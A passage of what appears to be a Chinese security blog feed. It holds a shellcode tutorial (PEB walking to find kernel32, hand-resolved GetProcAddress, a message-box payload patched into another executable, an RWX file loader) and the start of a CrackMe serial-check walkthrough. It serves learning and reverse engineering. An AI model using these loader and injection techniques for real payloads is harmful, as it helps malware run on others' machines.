class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ucrtd.lib&quot;</span>) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;msvcrtd.lib&quot;) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;vcruntimed.lib&quot;) </span><br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax,[eax+<span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret <br>&#125;<br>&#125;<br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br><br><br><br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br><br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span> *lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br><span class="hljs-comment">//PWORD </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则4"><a href="#shellcode编写原则4" class="headerlink" title="shellcode编写原则4"></a>shellcode编写原则4</h4><ul><li><p>避免全局变量的使用</p></li><li><p>确保已加载所使用的API的动态链接库</p></li></ul><h4 id="第一种shellcode生成框架"><a href="#第一种shellcode生成框架" class="headerlink" title="第一种shellcode生成框架"></a>第一种shellcode生成框架</h4><p>通过上述操作直接编写，编写一个拥有弹窗功能的shellcode</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span></span>;<br>FARPROC _GetProcAddress(HMODULE hModule);<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* FN_LoadLibraryA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpLibFileName)</span></span>;<br><span class="hljs-keyword">char</span> szLoadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);<br><span class="hljs-keyword">char</span> szMessageBoxA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uType)</span></span>;<br><span class="hljs-keyword">char</span> szUser32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA);<br><span class="hljs-keyword">char</span> szHello[] = &#123; <span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szTitle[] = &#123; <span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>fn_MessageBoxA(<span class="hljs-literal">NULL</span>, szHello, szTitle, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax, [eax + <span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret<br>&#125;<br>&#125;<br><br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +<br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span>* lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后使用PEID查看偏移，可以看到是200,</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/10.png"></p><p>然后使用十六进制编辑器将其中的机器码拷贝出来。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/11.png"></p><p>选取一个替代的程序，查看其偏移</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/12.png"></p><p>然后进入编辑器，从偏移开始粘贴我们的机器码</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/13.png"></p><p>然后打开这个程序就会实现shellcode编写的弹窗效果了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/14.png"></p><h4 id="第二种shellcode生成框架"><a href="#第二种shellcode生成框架" class="headerlink" title="第二种shellcode生成框架"></a>第二种shellcode生成框架</h4><h5 id="单文件的函数生成位置规律"><a href="#单文件的函数生成位置规律" class="headerlink" title="单文件的函数生成位置规律"></a>单文件的函数生成位置规律</h5><p>单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。</p><p>如这样一个程序，定义的顺序是先A，后B</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/15.png"></p><p>在IDA中可以看到顺序是先B后A。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/16.png"></p><h5 id="多文件生成规律"><a href="#多文件生成规律" class="headerlink" title="多文件生成规律"></a>多文件生成规律</h5><p>与包含的文件位置无关，与实际调用顺序有关。</p><p>在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/17.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/18.png"></p><p>修改一下顺序，编译顺序也会改变</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/19.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/20.png"></p><h5 id="实际编写"><a href="#实际编写" class="headerlink" title="实际编写"></a>实际编写</h5><p>在其中定义几个文件</p><ul><li>0.entry.cpp：入口点</li><li>a.start.cpp：shellcode执行</li><li>z.end.cpp：shellcode结束</li></ul><p>a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">HANDLE hBin = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;sh.bin&quot;</span>, GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;<br>DWORD dwWrite;<br><span class="hljs-built_in">WriteFile</span>(hBin, ShellcodeStart, dwSize, &amp;dwWrite, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hBin);<br></code></pre></div></td></tr></table></figure><h5 id="shellcode加载器"><a href="#shellcode加载器" class="headerlink" title="shellcode加载器"></a>shellcode加载器</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(argv[<span class="hljs-number">1</span>], GENERIC_READ, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwSize;<br>dwSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID lpAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;virtual failed\n&quot;</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwRead;<br><span class="hljs-built_in">ReadFile</span>(hFile, lpAddr, dwSize, &amp;dwRead, <span class="hljs-number">0</span>);<br>__asm &#123;<br>call lpAddr<br>&#125;<br>_flushall();<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/21.png"></p>]]></content>
    
    
    <categories>
      
      <category>ShellCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>ShellCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-003</title>
    <link href="/2021/07/21/160CrackMe-003/"/>
    <url>/2021/07/21/160CrackMe-003/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序看到需要输入用户名和序列号尝试输入后提示错误</p><p><img src="/2021/07/21/160CrackMe-003/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用工具查看，发现未加壳，语言是VB。</p><p><img src="/2021/07/21/160CrackMe-003/2.png"></p><p>用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0]</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004081E3</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">18</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaHresu&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaHresultCheckObj<br><span class="hljs-attribute">004081E9</span>   &gt;  <span class="hljs-number">8</span>B<span class="hljs-number">95</span> <span class="hljs-number">50</span>FFFFFF mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xB<span class="hljs-number">0</span>]<br><span class="hljs-attribute">004081EF</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>C]          ;  获取输入的name<br><span class="hljs-attribute">004081F2</span>   .  <span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-number">00004000</span> ???<br><span class="hljs-attribute">004081F3</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">1</span>A          mov ebx,dword ptr ds:[edx]               ; |<br><span class="hljs-attribute">004081F5</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">8</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaLenBs&gt;; \获取name长度<br><span class="hljs-attribute">004081FB</span>   .  <span class="hljs-number">8</span>BF<span class="hljs-number">8</span>          mov edi,eax<br><span class="hljs-attribute">004081FD</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D E<span class="hljs-number">8</span>       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">18</span>]<br><span class="hljs-attribute">00408200</span>   .  <span class="hljs-number">69</span>FF <span class="hljs-number">385</span>B<span class="hljs-number">0100</span> imul edi,edi,<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span>                     ;  长度乘以<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span><br><span class="hljs-attribute">00408206</span>   .  <span class="hljs-number">51</span>            push ecx                                 ; /String = <span class="hljs-number">091</span>C<span class="hljs-number">840</span>A ???<br><span class="hljs-attribute">00408207</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> B<span class="hljs-number">7050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span>                     ; |<br><span class="hljs-attribute">0040820D</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">0</span>CB<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.#<span class="hljs-number">516</span>&gt;]     ; \获取输入name的第一次ascii码<br><span class="hljs-attribute">00408213</span>   .  <span class="hljs-number">0</span>FBFD<span class="hljs-number">0</span>        movsx edx,ax<br><span class="hljs-attribute">00408216</span>   .  <span class="hljs-number">03</span>FA          add edi,edx                              ;  长度计算后加上name[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00408218</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> A<span class="hljs-number">6050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span><br><span class="hljs-attribute">0040821E</span>   .  <span class="hljs-number">57</span>            push edi                                 ;  Msvbvm<span class="hljs-number">50</span>.__vbaObjSet<br><span class="hljs-attribute">0040821F</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">4</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrI<span class="hljs-number">4</span>&gt;;  转字符串（十进制）<br></code></pre></div></td></tr></table></figure><p>然后将结果转为浮点数执行了几次操作。</p><p>第一次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004082E9</span>   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword 